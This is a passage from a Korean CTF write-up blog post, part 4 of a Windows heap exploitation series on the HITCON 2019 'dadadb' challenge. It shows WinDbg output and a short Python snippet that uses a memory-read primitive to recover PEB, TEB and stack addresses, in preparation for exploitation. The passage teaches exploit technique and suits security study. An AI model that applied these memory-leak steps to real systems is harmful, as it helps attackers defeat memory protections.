<h2 id="PEB-Stack-address"><a href="#PEB-Stack-address" class="headerlink" title="PEB/Stack address"></a>PEB/Stack address</h2><p><code>!address -summary</code> 로 PEB와 TEB, Stack주소를 확인할 수 있습니다.</p>
<pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !address -summary
--- Largest Region by Usage ----------- Base Address -------- Region Size ----------
Free                                    <span class="hljs-number">275</span>`<span class="hljs-number">1e0</span>c0000     <span class="hljs-number">7</span>b7f`<span class="hljs-number">3</span>dea0000 ( <span class="hljs-number">123.497</span> TB)
MappedFile                             <span class="hljs-number">7</span>df5`<span class="hljs-number">5f</span>ec4000      <span class="hljs-number">1f</span>f`d6aed000 (   <span class="hljs-number">1.999</span> TB)
&lt;unknown&gt;                              <span class="hljs-number">7</span>df4`<span class="hljs-number">5</span>c060000        <span class="hljs-number">1</span>`<span class="hljs-number">00020000</span> (   <span class="hljs-number">4.000</span> GB)
Image                                  <span class="hljs-number">7f</span>fd`<span class="hljs-number">4</span>a817000        <span class="hljs-number">0</span>`<span class="hljs-number">00163000</span> (   <span class="hljs-number">1.387</span> MB)
Stack                                    e4`<span class="hljs-number">4f</span>c00000        <span class="hljs-number">0</span>`<span class="hljs-number">000f</span>c000 (<span class="hljs-number">1008.000</span> kB)
Heap                                    <span class="hljs-number">275</span>`<span class="hljs-number">1</span>dfce000        <span class="hljs-number">0</span>`<span class="hljs-number">000f</span>1000 ( <span class="hljs-number">964.000</span> kB)
Other                                  <span class="hljs-number">7</span>df5`<span class="hljs-number">5e0</span>a0000        <span class="hljs-number">0</span>`<span class="hljs-number">00033000</span> ( <span class="hljs-number">204.000</span> kB)
TEB                                      e4`<span class="hljs-number">4f</span>9ca000        <span class="hljs-number">0</span>`<span class="hljs-number">00002000</span> (   <span class="hljs-number">8.000</span> kB)
PEB                                      e4`<span class="hljs-number">4f</span>9c9000        <span class="hljs-number">0</span>`<span class="hljs-number">00001000</span> (   <span class="hljs-number">4.000</span> kB)</code></pre>

<p>PEB는 ntdll의 bss 영역에 위치하며 PEB 주소는 아까 구한 <code>pebldr</code> 주소 근처에 있으니 뒤적뒤적거리며 찾다 보면 나옵니다 ㅎㅎ;</p>
<pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lm
start             end                 module name    
...    
<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d6a0000 <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d890000   ntdll

<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dt ntdll!_PEB @$peb Ldr
   +<span class="hljs-number">0x018</span> Ldr : <span class="hljs-number">0x00007ffd</span>`<span class="hljs-number">4</span>d8053c0 _PEB_LDR_DATA

<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">0x00007ffd</span>`<span class="hljs-number">4</span>d8053c0  - <span class="hljs-number">100</span>
<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d8052c0  ffffffff`ffffffff
...
<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805328  <span class="hljs-number">000000e4</span>`<span class="hljs-number">4f</span>9c9240
<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805330  <span class="hljs-number">00000000</span>`<span class="hljs-number">00620026</span>
<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805338  <span class="hljs-number">00000275</span>`<span class="hljs-number">1</span>dfc2470</code></pre>

<p><code>PEB+0x240</code>은 <code>ntdll+0x165328</code>에 있으며 TEB는 <code>PEB + 0x1000</code>에, Stack address는 <code>TEB + 0x10</code>에 있으니 같이 구하겠습니다.</p>
<pre><code class="hljs python">peb = readmem(key, ntdll + <span class="hljs-number">0x165328</span>) - <span class="hljs-number">0x240</span>
teb = peb + <span class="hljs-number">0x1000</span>
stack = readmem(key, teb+<span class="hljs-number">0x10</span>)
print(<span class="hljs-string">&quot;peb :&quot;</span>,hex(peb))
print(<span class="hljs-string">&quot;teb :&quot;</span>,hex(teb))</code></pre>

<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2021.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2021.png"></p>
<hr>
<p>드디어ㅓㅓㅓ 익스에 필요한 모든 정보를 구했습니다! </p>
<p>다음 파트에서는 본격적으로 exploit을 해보도록 하겠으며 전 그럼 이미 망한 중간고사 공부하러 20000..</p>
<h1 id="Part-5-예고"><a href="#Part-5-예고" class="headerlink" title="Part 5 예고"></a>Part 5 예고</h1><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2022.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2022.png"></p>
<blockquote>
<p>??? : 나만익스안돼나만익스안돼나만익스안돼   -2020 겨울, 크리스마스 CTF 문제 제작 중-</p>
</blockquote>
<p>과연 다음 글에서는 작년과 같은 참사 없이 익스에 성공해 Flag를 영접할 수 있을지…</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/windows/">windows</a>
                  
                  <a class="hover-with-bg" href="/tags/heap/">heap</a>
                  
                  <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                  
                  <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
                  
                  <a class="hover-with-bg" href="/tags/research/">research</a>
                  
                  <a class="hover-with-bg" href="/tags/lfh/">lfh</a>
                  
                  <a class="hover-with-bg" href="/tags/nt-heap/">nt heap</a>
                  
                  <a class="hover-with-bg" href="/tags/hitcon/">hitcon</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_L0ch.jpg" srcset="/img/loading.gif" alt="L0ch">
                  </div>

                  <div class="link-text">
                    <div class="link-title">L0ch</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/L0ch">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>

              <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              
              <!--  -->
              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2021/04/19/idioth/2021-04-19/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[하루한줄] CVE-2021-28316: Windows workstation FDE bypass and EOP</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2021/04/17/fabu1ous/2021-04-17/">
                    <span class="hidden-mobile">[하루한줄] CVE-2021-28459: Microsoft Azure DevOps Server Reflected XSS</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/';
        this.page.identifier = '/2021/04/18/l0ch/pwncoolsexy-part4/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>

















  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
